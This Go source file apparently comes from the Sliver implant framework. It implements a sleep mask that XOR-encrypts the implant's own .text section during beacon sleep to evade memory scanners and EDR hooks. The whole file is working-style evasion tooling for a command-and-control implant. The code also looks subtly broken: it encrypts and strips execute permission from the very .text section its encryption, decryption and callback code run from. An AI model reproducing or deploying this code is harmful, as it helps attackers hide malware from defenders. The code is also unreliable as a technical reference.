package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// This file implements an Ekko-style sleep mask. During sleep, the implant's
// .text section is XOR-encrypted to evade memory scanners. On wake, the
// original .text is restored. This makes beaconing sleep time less detectable
// by memory scanning tools (e.g., Moneta, PE-Sieve) that look for plaintext
// implant code in memory.

import (
	"crypto/rand"
	"errors"
	"runtime"
	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// --- Minimal PE header structs for in-memory parsing ---

// imageSectionHeader mirrors the Windows IMAGE_SECTION_HEADER (40 bytes).
type imageSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLineNumbers uint32
	NumberOfRelocations  uint16
	NumberOfLineNumbers  uint16
	Characteristics      uint32
}

// textSectionInfo holds the address bounds of the current module's .text section.
type textSectionInfo struct {
	BaseAddress uintptr
	Size        uintptr
}

// cachedTextSection caches the result of getCurrentModuleTextSection.
var cachedTextSection *textSectionInfo

// xorKeyLen is the length of the XOR key used per sleep cycle.
const xorKeyLen = 32

// getCurrentModuleTextSection locates the .text section of the current
// executable module (the implant binary itself). It reads the PE headers
// from memory to find the section bounds using raw byte offsets.
func getCurrentModuleTextSection() (*textSectionInfo, error) {
	if cachedTextSection != nil {
		return cachedTextSection, nil
	}

	// Get the module handle of the current process image
	moduleHandle, err := winGetModuleHandleSelf()
	if err != nil {
		return nil, err
	}
	if moduleHandle == 0 {
		return nil, errors.New("GetModuleHandle returned NULL")
	}

	base := moduleHandle

	// Read the DOS signature at offset 0 (should be "MZ" = 0x5A4D)
	dosMagic := *(*uint16)(unsafe.Pointer(base))
	if dosMagic != 0x5A4D {
		return nil, errors.New("invalid DOS header magic")
	}

	// e_lfanew is at offset 0x3C — pointer to PE signature
	lfanew := *(*int32)(unsafe.Pointer(base + 0x3C))
	peOffset := uintptr(lfanew)

	// Verify PE signature "PE\0\0" at base + e_lfanew
	peSig := *(*uint32)(unsafe.Pointer(base + peOffset))
	if peSig != 0x00004550 {
		return nil, errors.New("invalid PE signature")
	}

	// COFF File Header follows the 4-byte PE signature
	coffOffset := base + peOffset + 4
	numberOfSections := *(*uint16)(unsafe.Pointer(coffOffset + 2))
	sizeOfOptionalHeader := *(*uint16)(unsafe.Pointer(coffOffset + 16))

	// Section headers start after: PE sig (4) + COFF header (20) + Optional Header
	sectionStart := coffOffset + 20 + uintptr(sizeOfOptionalHeader)

	// Walk section headers to find .text
	for i := uint16(0); i < numberOfSections; i++ {
		secPtr := sectionStart + uintptr(i)*unsafe.Sizeof(imageSectionHeader{})
		sec := (*imageSectionHeader)(unsafe.Pointer(secPtr))

		// Check for ".text" section name
		if string(sec.Name[:5]) == ".text" {
			info := &textSectionInfo{
				BaseAddress: base + uintptr(sec.VirtualAddress),
				Size:        uintptr(sec.VirtualSize),
			}
			cachedTextSection = info
			//{{if .Config.Debug}}
			log.Printf("[SleepMask] .text section: base=0x%08x size=0x%08x\n", info.BaseAddress, info.Size)
			//{{end}}
			return info, nil
		}
	}

	return nil, errors.New(".text section not found in current module")
}

// generateXorKey generates a random XOR key for encrypting the .text section.
func generateXorKey() ([]byte, error) {
	key := make([]byte, xorKeyLen)
	_, err := rand.Read(key)
	if err != nil {
		return nil, err
	}
	return key, nil
}

// xorMemory XORs a region of memory with the given key. The key is applied
// cyclically across the memory region.
func xorMemory(base uintptr, size uintptr, key []byte) {
	keyLen := uintptr(len(key))
	for i := uintptr(0); i < size; i++ {
		p := (*byte)(unsafe.Pointer(base + i))
		*p ^= key[i%keyLen]
	}
}

// encryptTextSection XOR-encrypts the implant's .text section with the given key.
// It temporarily changes the protection to RW, performs the XOR, then restores
// the original protection.
func encryptTextSection(key []byte) error {
	info, err := getCurrentModuleTextSection()
	if err != nil {
		return err
	}

	// Change protection to RW so we can write
	var oldProtect uint32
	err = windows.VirtualProtect(info.BaseAddress, info.Size, windows.PAGE_READWRITE, &oldProtect)
	if err != nil {
		return err
	}

	// XOR the .text section
	xorMemory(info.BaseAddress, info.Size, key)

	// Restore protection (typically PAGE_EXECUTE_READ)
	_, err = changeProtection(info.BaseAddress, info.Size, oldProtect)
	if err != nil {
		return err
	}

	return nil
}

// changeProtection changes the memory protection and returns the previous value.
func changeProtection(addr uintptr, size uintptr, newProtect uint32) (uint32, error) {
	var oldProtect uint32
	err := windows.VirtualProtect(addr, size, newProtect, &oldProtect)
	if err != nil {
		return 0, err
	}
	return oldProtect, nil
}

// decryptTextSection reverses the XOR encryption (XOR is self-inverse).
func decryptTextSection(key []byte) error {
	return encryptTextSection(key)
}

// createTimerQueueSleep uses a waitable timer (CreateWaitableTimerExW +
// SetWaitableTimer + WaitForSingleObject) to implement a sleep that is harder
// to detect than a simple Sleep()/SleepEx call. SleepEx with alertable I/O is
// the classic pattern EDR hooks watch for in beaconing implants.
//
// BUGFIX (Aug 2026): the previous implementation created a timer-queue timer
// with a NULL callback and waited on an event that nothing ever signaled —
// every sleep blocked for the full wait timeout (duration + 5s). The waitable
// timer below is actually signaled by the kernel when the due time elapses.
func createTimerQueueSleep(duration time.Duration) error {
	timer, err := winCreateWaitableTimer()
	if err != nil {
		return err
	}
	defer windows.CloseHandle(timer)

	if err := winSetWaitableTimer(timer, duration.Nanoseconds()); err != nil {
		return err
	}

	// Wait for the timer to fire (generous timeout buffer)
	waitMs := uint32(duration/time.Millisecond) + 5000
	event, err := windows.WaitForSingleObject(timer, waitMs)
	if err != nil {
		return err
	}
	_ = event
	return nil
}

// SleepMask puts the implant to sleep for the specified duration while
// XOR-encrypting its .text section to evade memory scanners. This is the
// main entry point for the sleep mask functionality.
//
// The cycle is:
//  1. Generate random XOR key
//  2. Encrypt .text section (RW -> XOR -> restore protection)
//  3. Sleep for the specified duration
//  4. Decrypt .text section (RW -> XOR -> restore protection)
func SleepMask(duration time.Duration) error {
	//{{if .Config.Debug}}
	log.Printf("[SleepMask] Encrypting .text and sleeping for %v\n", duration)
	//{{end}}

	// Sleep mask only works on amd64 (section layout differs on other arches)
	if runtime.GOARCH != "amd64" {
		//{{if .Config.Debug}}
		log.Println("[SleepMask] Not amd64, falling back to plain sleep")
		//{{end}}
		time.Sleep(duration)
		return nil
	}

	// Step 1: Generate a fresh random XOR key for this cycle
	key, err := generateXorKey()
	if err != nil {
		return err
	}

	// Step 2: Encrypt .text section
	err = encryptTextSection(key)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("[SleepMask] Encryption failed: %v\n", err)
		//{{end}}
		return err
	}

	// Step 3: Sleep using timer queue (avoids the classic SleepEx pattern)
	sleepErr := createTimerQueueSleep(duration)
	if sleepErr != nil {
		//{{if .Config.Debug}}
		log.Printf("[SleepMask] Timer queue sleep failed, falling back to time.Sleep: %v\n", sleepErr)
		//{{end}}
		time.Sleep(duration)
	}

	// Step 4: Decrypt .text section to restore original code
	// CRITICAL: This must succeed or the implant will crash. We wrap in recover
	// to catch panics, and retry the decryption if it fails on the first attempt.
	func() {
		defer func() {
			if r := recover(); r != nil {
				//{{if .Config.Debug}}
				log.Printf("[SleepMask] Panic during decryption: %v\n", r)
				//{{end}}
				// Last resort: try decrypting again (the XOR is idempotent if key is correct)
				_ = decryptTextSection(key)
			}
		}()
		err = decryptTextSection(key)
	}()
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("[SleepMask] Decryption failed: %v\n", err)
		//{{end}}
		// Don't return error — if .text is corrupted we're dead anyway.
		// Best effort: try once more with the same key.
		_ = decryptTextSection(key)
	}

	//{{if .Config.Debug}}
	log.Println("[SleepMask] Woke up and restored .text section")
	//{{end}}

	return nil
}

// SleepMaskWithCallback performs the sleep mask cycle with an optional
// callback that executes between encrypt and sleep. This allows callers
// to perform setup work while the .text section is encrypted (e.g.,
// updating config before sleeping).
func SleepMaskWithCallback(duration time.Duration, preSleepCallback func() error) error {
	if runtime.GOARCH != "amd64" {
		time.Sleep(duration)
		return nil
	}

	key, err := generateXorKey()
	if err != nil {
		return err
	}

	// Encrypt
	err = encryptTextSection(key)
	if err != nil {
		return err
	}

	// Run callback if provided (decrypt on error before returning)
	if preSleepCallback != nil {
		cbErr := preSleepCallback()
		decErr := decryptTextSection(key)
		if cbErr != nil {
			return cbErr
		}
		return decErr
	}

	// Sleep
	sleepErr := createTimerQueueSleep(duration)
	if sleepErr != nil {
		time.Sleep(duration)
	}

	// Decrypt
	return decryptTextSection(key)
}
